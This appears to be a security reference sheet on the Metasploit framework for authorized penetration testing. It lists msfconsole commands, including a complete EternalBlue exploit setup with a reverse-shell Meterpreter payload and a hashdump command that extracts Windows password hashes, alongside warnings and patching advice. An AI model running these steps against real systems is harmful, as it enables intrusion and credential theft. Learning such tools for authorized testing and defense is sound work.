🧨 Metasploit

🎯 Purpose

Metasploit is an industry-standard penetration testing framework used by security professionals to discover vulnerabilities, execute exploits, and assess the security posture of systems, networks, and web applications in authorized environments.

🧠 Key Concepts

msfconsole: The central command-line interface used to launch modules, manage sessions, and configure target parameters.

Modules: Specialized software components used for different stages of an assessment:

Exploits: Code designed to take advantage of specific system vulnerabilities.

Payloads: Code executed on a target machine after a successful exploit (e.g., shell access, Meterpreter).

Auxiliary: Scanners, fuzzers, and enumeration tools that do not execute an exploit payload.

Post: Modules executed after gaining access to gather evidence or escalate privileges.

Encoders/Evasion: Tools used to obfuscate payloads to test defense detection capabilities.

Meterpreter: An advanced, in-memory payload that provides an interactive shell with extensive post-exploitation commands without creating new processes on disk.

💻 Commands

# Launch the Metasploit console
msfconsole

# Search for a specific exploit or module
search type:exploit name:eternalblue

# Select a module to use
use exploit/windows/smb/ms17_010_eternalblue

# Display configurable options for the selected module
show options

# Set target and payload options
set RHOSTS 192.168.1.50
set LHOST 10.10.10.2
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run the exploit or auxiliary module
exploit
# or
run

# Manage active background sessions
sessions -l
sessions -i 1



📋 Examples

Basic Network Service Vulnerability Scan:

msfconsole
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 80,443,445
run



Interacting with a Meterpreter Session:

# Check current user identity and system details
getuid
sysinfo

# Dump password hashes from memory (Windows)
hashdump



🔎 Investigation

Assess Defense Efficacy: Use auxiliary modules to verify whether network Intrusion Detection Systems (IDS) detect active scanning or exploitation attempts.

Validate Patch Status: Safely test vulnerability scanner findings against production environments to rule out false positives.

Inspect Session Logs: Audit post-exploitation actions taken during a test to ensure activities remain within the agreed Scope of Work.

⚠️ Important

System Instability: Unverified exploits can cause service disruptions or Blue Screens of Death (BSOD) on vulnerable target systems.

Payload Noise: Default Metasploit payloads generate significant telemetry and are quickly flagged by modern Endpoint Detection and Response (EDR) agents.

Authorization: Running Metasploit against unauthorized networks or hosts is illegal.

🛡️ Security

Ensure prompt patching of operating systems and applications to neutralize known Metasploit exploit modules.

Deploy EDR solutions and monitor endpoint event logs for signs of suspicious process injection or unauthorized shell spawns.

